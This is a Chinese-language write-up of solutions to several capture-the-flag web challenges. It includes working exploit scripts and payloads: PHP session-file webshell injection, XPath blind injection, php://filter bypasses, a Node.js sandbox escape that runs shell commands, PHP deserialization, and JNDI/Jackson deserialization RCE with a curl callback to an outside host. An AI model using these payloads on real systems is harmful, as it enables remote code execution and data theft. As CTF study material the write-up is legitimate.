m0on 的writeup
联系 QQ: 825178087


## 源代码
真签到题

直接抓包看到

![](http://mo0n.top/images/ha1cyon/50.png)

## 超简单的PHP！！！超简单！！！

主要代码：

```
header('content-type:application/json');
session_start();
function safe($msg){
    if (strlen($msg)>17){
        return "msg is too loooong!";
    } else {
        return preg_replace("/php/","?",$msg);
    }
}

if (!isset($_SESSION['msg'])&empty($_SESSION['msg']))$_SESSION['msg'] = array();

if (isset($_POST['msg']))
{

    array_push($_SESSION['msg'], ['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]);
    echo json_encode(array(['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]));
    exit();
}
if(!empty($_SESSION['msg'])){
    echo json_encode($_SESSION['msg']);
} else {echo "è¿ä¸å¿«å»çè¨ï¼";}
```


可以看到可以修改session，然后有一个`phpinfo.php`文件

看一下,看到`session.save_path`是空，也就是默认`/tmp`

有一个小限制

```
if (strlen($msg)>17){
        return "msg is too loooong!";
    } else {
        return preg_replace("/php/","?",$msg);
    }
```

不能用php，但是没有用`i`修饰符，就`PhP`绕过

后面还有一个time的语句，

就可以用换行`\n`和`#`注释来多次改session来写session文件

脚本
```
import requests

session = requests.session()

burp0_url = "http://ha1cyon-ctf.fun:30135/msg.php"
burp0_cookies = {"session": "acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I", "PHPSESSID": "4feut4nk0o5o37jjsg8173opk3"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://ha1cyon-ctf.fun:30135/index.bak.php?action=message.php", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
burp0_data = {"msg": "<?PhP \n#"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)




burp0_data = {"msg": "\neval($_GET[_]);#"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)



burp0_data = {"msg": "\n ?>"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


burp0_url = "http://ha1cyon-ctf.fun:30135/index.bak.php?action=/tmp/sess_4feut4nk0o5o37jjsg8173opk3&_=print_r(scandir('/'));print_r(file_get_contents('/FIag_!S_it'));"
r=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
print(r.text)

```

![](http://mo0n.top/images/ha1cyon/chao-jiandan-php.png)


## ezlogin 

登录抓包看看，是xml请求，第一反应就是XXE，

全部XXE打上去了并没有用，并不是XXE，

而是XPATH盲注

[https://www.cnblogs.com/backlion/p/8554749.html](https://www.cnblogs.com/backlion/p/8554749.html)

脚本
```
import requests
import re

url='http://ha1cyon-ctf.fun:30163/'
sess=requests.session()
def token():
    req=sess.get(url)
    tok=re.findall('<input type="hidden" id="token" value="(.*)" />',req.text)
    return tok[0]

def login(username,password):
    data='''
<username>{}</username><password>{}</password><token>{}</token>
'''.format(username,password,token())

    req=sess.post(url+'login.php',data=data,headers = {'Content-Type': 'application/xml'})
    print(req.text,req.status_code)
    return req


# root
payload="' or  substring(name(/*[position()=1]),{},1)='{}'  or '1' = '1"
ro='root'

payload="' or substring(name(/root/*[position()=1]),{},1)='{}'  or '1' = '1"
ro='accounts'

payload="' or substring(name(/root/accounts/*[position()=1]),{},1)='{}'  or '1' = '1"
ro='user'

payload="' or substring(name(/root/accounts/user/*[position()=2]),{},1)='{}'  or '1' = '1"
# id username password
ro=''


payload="1' or substring(/root/accounts/user[id=2]/username,{},1)='{}' or '1'='1"
# guest adm1n
ro=''

payload="1' or substring(/root/accounts/user[id=2]/password,{},1)='{}' or '1'='1"
#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123
ro=''

import string
for i in range(1,100):
    for j in string.digits+string.ascii_letters+'*':
        if j=='*':
            print('***************false')
            break
        tmp=payload.format(i,j)

        req=login(tmp,'ad')
        if '非法操作' in req.text:
            ro+=j
            print(ro)
            break


```

注入得到：

`adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f`

密码md5 解一下就是`gtfly123`


然后有一个文件包含，不能直接包含flag，显示有危险字符

又是用php://了

大概过滤了

```
php
read
base64
``` 

简单大小写绕过

`/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag`

![](http://mo0n.top/images/ha1cyon/ezlogin.png)


flag

flag{95f4aaf6-ae61-47a6-affa-6d2811efbe0e}




## 验证🐎

代码
```
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```


第一步是需要`if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {`

可以看到用了`app.use(bodyParser.json());`

就是可以用json来绕过，

弄一个这个

```
"first":{"length":"1"},"second":{"length":"1"}
```

就可以绕过了，first和second现在都是object

而first.length===second.length, 而且

first!==second

最关键是

` md5(first+keys[0]) === md5(second+keys[0])`

这个代码，`first`是一个对象，和`keys[0]`拼接的时候就转换成String

而first的字符串和second的字符串相等，全部满足了

然后就是用Math来RCE了，利用函数嵌套的样子来

传入 Math+1 这个是字符形式

这个就是一个题目改编的了

脚本：

```
import re
encode = lambda code: list(map(ord,code))
decode = lambda code: "".join(map(chr,code))
a=f"""
(m0=>(
		m0=m0.constructor,
		m0.x=m0.constructor(
			m0.fromCharCode({encode("return process.mainModule.require('child_process').execSync('cat /flag')")})
		)()
	))(Math+1)
"""



a=re.sub(r"[\s\[\]]", "", a).replace("m0","Math")

print(a)
```

```
POST / HTTP/1.1
Host: ha1cyon-ctf.fun:30300
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ha1cyon-ctf.fun:30300/
Content-Type: application/json
Content-Length: 402
Connection: close
Cookie: session=acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I; PHPSESSID=4feut4nk0o5o37jjsg8173opk3; PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=Af7dna727rpLpx--lZVqoWD5BKU
Upgrade-Insecure-Requests: 1

{"e":"(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)","first":{"length":"1"},"second":{"length":"1"}}
```

![](http://mo0n.top/images/ha1cyon/yan-zheng-ma.png)

flag:

flag{8d82d5d6-741e-432a-be35-e43c23180b1a}


## RealEzPHP

就是一个简单反序列化，flag在phpinfo里面

```
<?php
class HelloPhp
{
    public $a;
    public $b;


}
$a=new HelloPhp();
$a->b='call_user_func';
$a->a='phpinfo';
echo urlencode(serialize($a));

?>
```

`http://ha1cyon-ctf.fun:30089/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A1%3A%22b%22%3Bs%3A14%3A%22call_user_func%22%3B%7D`

![](http://mo0n.top/images/ha1cyon/real-ez.png)

FLAG

flag{7b0e7129-48fa-44b7-a8d8-8e1ed7d4a21e} 


## ezshiro 

看到访问 `/json` 就跳到`/login`，

是一个比较新的`shiro`漏洞`CVE-2020-1957`

可以通过`/;/json`的方式绕过直接访问

`GET`访问是显示`Request method not support`

`POST a=1`访问，

看到`Unrecognized token  was expecting (&#39;true&#39;, &#39;false&#39; or &#39;null&#39;)`

所以直接POST true，看到`jackson interface`， 所以是`jackson`反序列化

看一下`pom.xml`有什么



```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>1.5.22.RELEASE</version>
    <relativePath/>
  </parent>

  <modelVersion>4.0.0</modelVersion>
  <artifactId>shiro-test</artifactId>
  <build>
    <plugins>
      <plugin>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-maven-plugin</artifactId>
        <configuration>
          <fork>true</fork>
          <mainClass>com.lfy.ctf.Application</mainClass>
        </configuration>
        <executions>
          <execution>
            <goals>
              <goal>repackage</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>

  <dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-web</artifactId>
      <version>1.5.1</version>
    </dependency>
    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-spring</artifactId>
      <version>1.5.1</version>
    </dependency>
    <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-core</artifactId>
      <version>1.2.1</version>
    </dependency>
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
    </dependency>
  </dependencies>

</project>
```
 

有`ch.qos.logback`和`commons-collections`，

然后看一下`jackson`有什么漏洞，根据`pom.xml`来看，直接筛选，看到有一个`logback`的

**CVE-2019-14439**可以 

利用是

`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://localhost:43658/Calc"}]`

那么是JNDI注入

然后题目是高版本的JDK，> 8u191,

`paper`上有绕过高版本的JDK限制进行JNDI注入

[https://paper.seebug.org/942/#ldapgadget](https://paper.seebug.org/942/#ldapgadget)

结合`pom.xml`的`commons-collections`,

就是利用LDAP返回序列化数据，触发本地Gadget，就是用Common Collections的了

本来想用这个的文章的代码，[https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java](https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java)

以前没实践过高版本的，只试过低版本的。然后随便翻翻其他的时候看到了可以更简单的

`ysomap`这个工具，在本地直接内网穿透

```
java -jar ysomap-cli-0.0.1-SNAPSHOT-all.jar
use exploit LDAPLocalChainListener
use payload  CommonsCollections8
use bullet TransformerBullet
set lport 5555
set version 3
set args 'curl xx.xx.xx.xxx/try/shell.php?a=test'
```

![](http://mo0n.top/images/ha1cyon/ysomap.png)

vps shell.php 内容是

```
<?php
$a=$_GET['a'];
file_put_contents('content',$a);

```

然后json发送

```
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://mu27062382.zicp.vip:18330/hhhhhh"}]
```

![](http://mo0n.top/images/ha1cyon/burp2.png)

虽然是报错返回500,但是其实是执行了的，在vps上可以看到效果

![](http://mo0n.top/images/ha1cyon/vps.png)

成功执行命令，RCE

flag

flag{ebcfc7fa-d9e7-4db1-9685-42684bc1aa76}

## ezinclude

第一层又双叒叕是一个hash拓展攻击，没有长度就爆破一下 

利用 `upload_progress`

```
import requests
import hashpumpy
import urllib



url='http://ha1cyon-ctf.fun:30004/'

for i in range(40):
    a,b=hashpumpy.hashpump('a3dabbc779f2fbf8b6f56113ca78a7f9','123444','1',i)

    req=requests.get(url+"name={}&pass={}".format(urllib.parse.quote(b),a))
    if 'username/password error' not in req.text:
        print(req.text,url+"name={}&pass={}".format(urllib.parse.quote(b),a))
        


```

跳到

`flflflflag.php`

可以文件包含

这里是用 `upload_progress`来写shell，然后包含

![](http://mo0n.top/images/ha1cyon/php-upload-progress.png)

然后包含/tmp/m0on getshell，好像flag又是在phpinfo里面，根目录的是假的


flag:

flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}

